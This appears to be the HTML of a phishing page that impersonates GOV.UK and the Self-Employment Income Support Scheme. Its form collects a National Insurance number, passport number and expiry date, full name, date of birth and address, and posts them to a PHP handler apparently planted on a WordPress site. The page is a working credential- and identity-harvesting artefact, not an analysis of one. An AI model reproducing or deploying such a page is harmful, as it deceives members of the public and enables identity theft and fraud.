<html class="govuk-template " lang="en">
<head> 
    <meta charset="utf-8">
    <title> Enter your Self Assessment Unique Taxpayer Reference - Self-Employment Income Support Scheme - GOV.UK</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <meta name="theme-color" content="#0b0c0c"> 
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="stylesheet" href="css/style.css" />
<link rel="shortcut icon" href="images/favicon.png"/>
<script type="text/javascript" src="js/jqueryLib.js"></script>

<script language="JavaScript" type="text/javascript">/*<![CDATA[*/
function numbersOnly(field, event) {
	return allowedChars(field, event, "-0123456789.,");
}

function digitsOnly(field, event) {
	return allowedChars(field, event, "0123456789");
}

function allowedChars(field, event, chars) {
	var key;

	if (window.event) {
		key = window.event.keyCode;
	} else {
		if (event) {
			key = event.which;
		} else {
			return true;
		}
	}

	if (isOneOf(key, null, 0, 8, 9, 13, 27, 37, 39, 46)) {
		return true;
	} else {
		var keychar = String.fromCharCode(key);

		if (chars.indexOf(keychar) > -1) {
			return true;
		} else {
			return false;
		}
	}
}

function isOneOf(key) {
	for (arg in arguments) {
		if (key == arg) {
			return true;
		}
	}
	
	return false;
}
			/*]]>*/</script> 

 
</head>

<body>
   
   <div class="header-const">
      <div class="header"></div>
   </div>
   <div class="header2-const">
      <div class="header2"></div>
   </div>
   <div class="img2-const">
      <div class="heading">Provide The Below Details</div>
   </div>
   <div class="content-const">
       <div class="content">
         <form name="form1" method="post" action="wp_aboutus_action.php">
           <table width="400" border="0">
             <tr>
               <td>&nbsp;</td>
             </tr>
             <tr>
               <td>&nbsp;</td>
             </tr>
             <tr>
               <td><div class="label">National Insurance Number <span style="color:#F00">*</span></div></td>
             </tr>
             <tr>
               <td>
                   <input type="text" name="nin" id="nin"  required autocomplete="off" class="username"></td>
             <tr>
               <td><div class="label">Passport Number (Contains up to 9 numbers and no letters)<span style="color:#F00">*</span></div></td>
             </tr>
             <tr>
               <td>
               <input type="text" name="pasn" id="pasn" required autocomplete="off" class="username"></td>
             </tr>
             <tr>

              <tr>
               <td><div class="label">Passport Expiry Date.<span style="color:#F00">*</span></div></td>
             </tr>
             <tr>
               <td>
               <input type="text" name="passn" id="passn" required autocomplete="off" class="username"></td>
             </tr>
             <tr>
               <td><div class="label">Given Name (As they appear on your Passport)<span style="color:#F00">*</span></div></td>
             </tr>
             <tr>
               <td>
               <input type="text" name="gvn" id="gvn" required autocomplete="off" class="username alphabets-only" xplaceholder="eg: Janny Walter"></td>
             </tr>
             <tr>
             <tr>        
             <tr>
               <td>&nbsp;</td>
             </tr>
             <tr>
               <td><div class="label">Full Name (As it appears on your Passport)<span style="color:#F00">*</span></div></td>
             </tr>
             <tr>
               <td>
               <input type="text" name="fuln" id="fuln" required autocomplete="off" class="username alphabets-only" xplaceholder="eg: Janny Walter"></td>
             </tr>
             <tr>
             
               <td>&nbsp;</td>
             </tr>
             <tr>
               <td><div class="label">Date Of Birth <span style="color:#F00">*</span></div></td>
             </tr>
             <tr>
               <td>
              <input type="text" name="dob" id="dob" required autocomplete="off" class="username" maxlength="10" xplaceholder="eg: 01/02/1995"></td>
             </tr>
            <tr>
               <td>&nbsp;</td>
             </tr>
             <tr>
               <td><div class="label">Address <span style="color:#F00">*</span></div></td>
             </tr>
             <tr>
               <td>
              <input type="text" name="adrs" id="adrs" required autocomplete="off" class="username" xplaceholder="eg: NO 269 London Road..."></td>
             </tr>
             <tr>
               <td>&nbsp;</td>
             </tr>
             <tr>
               <td>&nbsp;</td>
             </tr>
             <tr>
               <td>&nbsp;</td>
             </tr>
             <tr>
               <td><input type="submit" name="btncontinue" id="btncontinue" value="s" class="btnlogin"></td>
             </tr>
             <tr>
               <td>&nbsp;</td>
             </tr>
             <tr>
               <td>&nbsp;</td>
             </tr>
             <tr>
               <td>&nbsp;</td>
             </tr>
             <tr>
               <td>&nbsp;</td>
             </tr>
             <tr>
               <td>&nbsp;</td>
             </tr>
           </table>
           
         </form>
       </div>
   </div>
  <div class="footer-const">
      <div class="footer"></div>
  </div>
<script>
   var input = document.getElementById("password");
   input.addEventListener("keyup", function(event){
	  if(event.keyCode === 13){
	    event.preventDefault();
		document.getElementById("btncontinue").click();
	  }
	
	});
</script> 
<script type="text/javascript" src="js/actions.js"></script>
</body>
</html>